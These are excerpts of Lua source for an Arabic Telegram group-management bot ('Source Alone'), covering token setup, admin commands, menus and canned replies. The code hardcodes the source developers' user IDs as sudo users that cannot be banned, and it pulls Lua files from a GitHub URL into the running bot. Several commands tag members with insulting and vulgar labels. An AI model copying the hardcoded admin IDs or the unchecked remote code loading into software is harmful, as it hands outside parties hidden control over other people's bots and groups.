...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\naٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31mٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \naٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35mٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.write('\27[0;31mٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end  
os.execute('lua DRAGON.lua')
end 
end
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "ٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "TG IS NOT FIND IN FILES BOT"
echo "ٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ ٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ ┉"
exit 1
fi
if [ ! $token ]; then
echo "ٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ ٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ ┉ ┉"
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ahmedsiria/si/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1726705278,1465250253,1877543059,1767369613,1781270649}   
...
var = true  
elseif tonumber(user_id) == tonumber(1877543059) then
var = true  
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𓆩 𝘼𝙇✶𝙉𝙀 𓆪.")  
...
SourceDRAGONr = '🧚‍♂️اهلا عزيزي\n🧚‍♂️انا بوت اسمي ايدك\n🧚‍♂️اختصاصي حمايه الكروبات\n🧚‍♂️من تكرار والسبام والتوجيه والخ…\n🧚‍♂️لتفعيلي اتبع الاخطوات…↓\n🧚‍♂️اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع 🧚‍♂️{ منشئ او المشرفين } بتفعيل فقط\n[🧚‍♂️معرف المطور '
end 
...
{'ٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ'},
{'قناة السورس'},
{'ٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ'},
{'تويت','صراحه'},
{'ٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ'},
...
{{text = 'اقمـد من القمـدن  ياروحـي.', url="t.me/siria2"}},
}
...
local Text = [[
🔗 𓆩𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀𓆪🔗
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' 🔗 𓆩𝘿𝙚𝙫 𝙎𝙞𝙧𝙞𝙖𓆪🔗 ℡  ',url="t.me/siria2"}},
{{text = ' 🔗 𓆩𝘿𝙚𝙫 𝙊𝙧𝙖𝙗𝙞𓆪🔗 ',url="t.me/DEV_ORABI"}},
{{text = ' 🔗 𓆩𝘿𝙚𝙫 𝘼𝙢𝙤𝙧𝙮𓆪🔗 ',url="t.me/Dv_69"}},
{{text = '🔗 𓆩𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀𓆪🔗 ℡ ', url="t.me/SOURCE_SYRIA"}},
{{text = '🔗 𓆩اضـف البوت لمجموعتك🔗 ℡ ', url="t.me/TEEUSISU_bot?startgroup=start"}},
...
if tonumber(result.sender_user_id_) == tonumber(1877543059) then  
send(msg.chat_id_, msg.id_, " 🧚‍♂️ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
function(arg,data) 
usertext = '\n 🧚‍♂️ العضو 🧚‍♂️ ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
...
if result.id_ == tonumber(1877543059) then
send(msg.chat_id_, msg.id_, " 🧚‍♂️ لا يمكنك حظر مبرمج السورس \n")
return false 
end
usertext = '\n 🧚‍♂️ العضو 🧚‍♂️ ['..result.title_..'](t.me/'..(username or 'DV_POWER1')..')'
...
if tonumber(userid) == tonumber(1877543059) then  
send(msg.chat_id_, msg.id_, " 🧚‍♂️ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/ahmedsiria/si/main/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/ahmedsiria/si/main/File_Bot/"..file)
if res == 200 then
...
send(msg.chat_id_, msg.id_, ' 🧚‍♂️ تم مسح جميع المتوحدين')
end
if text == ("تاك للمتوحدين") and Mod(msg) then
local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
t = "\n 🧚‍♂️ قائمة متوحدين الجروب \n⩹━━━━━━ 𝗦??𝗨𝗥𝗖𝗘 𝗜𝗗𝗞 𖠱²² ━━━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."🧚‍♂️ المتوحد [@"..username.."]\n"
else
t = t..""..k.."🧚‍♂️ المتوحد `"..v.."`\n"
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🧚‍♂️ العضو 🧚‍♂️ ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 🧚‍♂️ تم رفع العضو متوحد في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🧚‍♂️ العضو 🧚‍♂️ ['..data.first_name_..'](t.me/'..(data.username_ or 'idek9')..')'
status  = '\n 🧚‍♂️ تم تنزيل العضو متوحد في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 🧚‍♂️ تم مسح جميع الزوجات')
end
if text == ("تاك للزوجات") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n 🧚‍♂️ قائمه زوجات الجروب \n⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗜𝗗𝗞 𖠱²² ━━━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."🧚‍♂️ الزوجه [@"..username.."]\n"
else
t = t..""..k.."🧚‍♂️ الزوجه `"..v.."`\n"
end
end
if #list == 0 then
t = " 🧚‍♂️ مع الاسف لا يوجد زوجه"
end
send(msg.chat_id_, msg.id_, t)
end
---------
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🧚‍♂️ العضــو 🧚‍♂️ ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 🧚‍♂️ تم رفع العضــو زوجه في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🧚‍♂️ العضــو 🧚‍♂️ ['..data.first_name_..'](t.me/'..(data.username_ or 'idek9')..')'
status  = '\n 🧚‍♂️ تم تنزيل العضــو الزوجات من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 🧚‍♂️ تم مسح جميع الكلاب')
end
...
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."🧚‍♂️ الكلب [@"..username.."]\n"
else
t = t..""..k.."🧚‍♂️ الكلب `"..v.."`\n"
end
end
if #list == 0 then
t = " 🧚‍♂️ مع الاسف لا يوجد كلاب"
end
send(msg.chat_id_, msg.id_, t)
end
---------
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🧚‍♂️ العضــو 🧚‍♂️ ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 🧚‍♂️ تم رفع العضــو كلب في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🧚‍♂️ العضــو 🧚‍♂️ ['..data.first_name_..'](t.me/'..(data.username_ or 'idek9')..')'
status  = '\n 🧚‍♂️ تم تنزيل العضــو كلب من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 🧚‍♂️ تم تنزيل جميع حمير من الجروب')
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🧚‍♂️ العضو 🧚‍♂️ ['..data.first_name_..'](t.me/'..(data.username_ or 'idek9')..')'
local  statuss  = '\n 🧚‍♂️ تم رفع المتهم حمار بالجروب\n 🧚‍♂️ الان اصبح حمار الجروب'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 🧚‍♂️ تم تنزيل جميع وتكات الجروب')
end
if text == ("تاك للوتكات") and Mod(msg) then
local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
t = "\n 🧚‍♂️ قائمة وتكات الجروب \n⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗜𝗗𝗞 𖠱²² ━━━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."🧚‍♂️ الوتكه [@"..username.."]\n"
else
t = t..""..k.."🧚‍♂️ الوتكه `"..v.."`\n"
end
end
...
send(msg.chat_id_, msg.id_, ' 🧚‍♂️ تم تنزيل جميع القرده بالجروب')
end
if text == ("تاك للقرود") and Mod(msg) then
local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
t = "\n 🧚‍♂️ قائمة القرود الجروب \n⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗜𝗗𝗞 𖠱²² ━━━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."🧚‍♂️ القرد [@"..username.."]\n"
else
t = t..""..k.."🧚‍♂️ القرد `"..v.."`\n"
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🧚‍♂️ العضو 🧚‍♂️ ['..data.first_name_..'](t.me/'..(data.username_ or 'idek9')..')'
local  statuss  = '\n 🧚‍♂️ تم رفع قرد في الجروب\n 🧚‍♂️ تعال حبي استلم موزه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 🧚‍♂️ تم تنزيل جميع الخولات بالجروب')
end
if text == ("تاك للخولات") and Mod(msg) then
local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
t = "\n 🧚‍♂️ قائمة خولات الجروب \n⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗜𝗗𝗞 𖠱²² ━━━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."🧚‍♂️ الخول [@"..username.."]\n"
else
t = t..""..k.."🧚‍♂️ الخول `"..v.."`\n"
end
end
...
send(msg.chat_id_, msg.id_, ' 🧚‍♂️ تم تنزيل الازببه من الجروب')
end
if text == ("تاك الازببه") and Mod(msg) then
local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
t = "\n 🧚‍♂️ قائمة البقرات الجروب \n⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗜𝗗𝗞 𖠱²² ━━━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."🧚‍♂️ الزب [@"..username.."]\n"
else
t = t..""..k.."🧚‍♂️ الزب "..v.."\n"
end
end
if #list == 0 then
t = " 🧚‍♂️ لا يوجد حد نايكه"
end
send(msg.chat_id_, msg.id_, t)
end
---------
...
send(msg.chat_id_, msg.id_, ' 🧚‍♂️ تم تنزيل جميع المزز بالجروب')
end
...
'\nءٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ'..
'\n♡︙  علامة ال {🔓} تعني مفعل'..
'\n♡︙  علامة ال {🔐} تعني معطل'..
'\nءٴ≪ـــــــــــــــــــــ𓆩 𝘼𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ'..
'\n♡︙  الروابط » { '..lock_links..
...
if text == 'بوت' then
Namebot = (database:get(bot_id..'Name:Bot') or 'الوون')
tdcli_function ({ ID = "GetBotProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
...
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'🧚‍♂️هاذا الامر خاص بالادمنيه\n🧚‍♂️غير مسموح لك ب هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
send(msg.chat_id_, msg.id_,'🧚‍♂️لا تستطيع استخدام البوت \n 🧚‍♂️يرجى الاشتراك بالقناه اولا \n 🧚‍♂️اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local Text =[[
اتبع الازرار تحت ⇣
واستمتع للأوامر 🕹️
[🧚‍♂️ 𝗦𝗢𝗨𝗥𝗖𝗘  𖠱²² 🧚‍♂️](t.me/SOURCE_SYRIA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '🧚‍♂️ اوامر الوضع 🧚‍♂️', callback_data="/help3"},{text = '🧚‍♂️ اوامر التنزيل والرفع 🧚‍♂️', callback_data="/help4"},
},
{
{text = '🧚‍♂️ اوامر المطورين 🧚‍♂️', callback_data="/help5"},{text = '🎭 اوامر الأعضاء 🎭', callback_data="/help6"},
},
{
...
send(msg.chat_id_, msg.id_, t..'⩹━━━━━━  𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀 𖠱²² ━━━━━━⩺\n℘︙ ➫ .[ ❍ ┇𓆩 𝘼𝙇✶𝙉𝙀 𓆪. ](t.me/SOURCE_SYRIA)➤ ')
end
...
🍁الاشعارات
⩹━━━━━━  𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀 𖠱²² ━━━━━━⩺
[🍁𝗦𝗢𝗨𝗥𝗖𝗘  𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀 𖠱²² 🍁](t.me/SOURCE_SYRIA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
🍁صورتي 
⩹━━━━━━  𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀 𖠱²² ━━━━━━⩺
[🍁𝗦𝗢𝗨𝗥𝗖𝗘  𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀 𖠱²² ⚡️](t.me/SOURCE_SYRIA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
⩹━━━━━━  𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀 𖠱²² ━━━━━━⩺
[🦋 ??𝗢𝗨𝗥𝗖??  𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀 𖠱²² 🦋](t.me/SOURCE_SYRIA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
🗯️التاريخ
⩹━━━━━━  𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀 𖠱²² ━━━━━━⩺
[🗯️ 𝗦𝗢𝗨𝗥𝗖𝗘  𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀 𖠱²² 🗯️](t.me/SOURCE_SYRIA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
keyboard.inline_keyboard = {
{
{text = '🦋 اوامر الوضع 🦋', callback_data="/help3"},{text = ' 🗯️ التنزيل والرفع 🗯️', callback_data="/help4"},
},
{
{text = '🦋 اوامر المطورين 🦋', callback_data="/help5"},{text = '💥 اوامر الأعضاء 💥', callback_data="/help6"},
},
...
{
{text = '𝗦𝗢𝗨𝗥𝗖𝗘  𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀 𖠱²²', url="t.me/SOURCE_SYRIA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[يولا يا وسخ 🥵](t.me/SOURCE_SYRIA)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[الحمد لله يقلبي ❤️](t.me/SOURCE_SYRIA)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[اوماااااال يا جدع 😹❤️](t.me/SOURCE_SYRIA)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[تيب تيب يعسل 😁](t.me/SOURCE_SYRIA)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[بلاش نكد بحبك 😁 ](t.me/SOURCE_SYRIA)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[يستر عايز اي 🤭](t.me/SOURCE_SYRIA)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/SOURCE_SYRIA)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/SOURCE_SYRIA)')
return false
end
end
end
...
{{text = '🧚‍♂️ ❪SＯＵＲＣＥ❫ 🧚‍♂️', url="t.me/SOURCE_SYRIA"}},
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المــبــرمـج سوريـآ',url="t.me/siria2"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == 'سلوكه' or text == 'سلمي' or text == 'ستك سلمي' then
local Text = [[
𓆩 ستـك سلوكـه يبني𓆪
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'سلمـي ♡',url="t.me/SAALOOOKAA"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
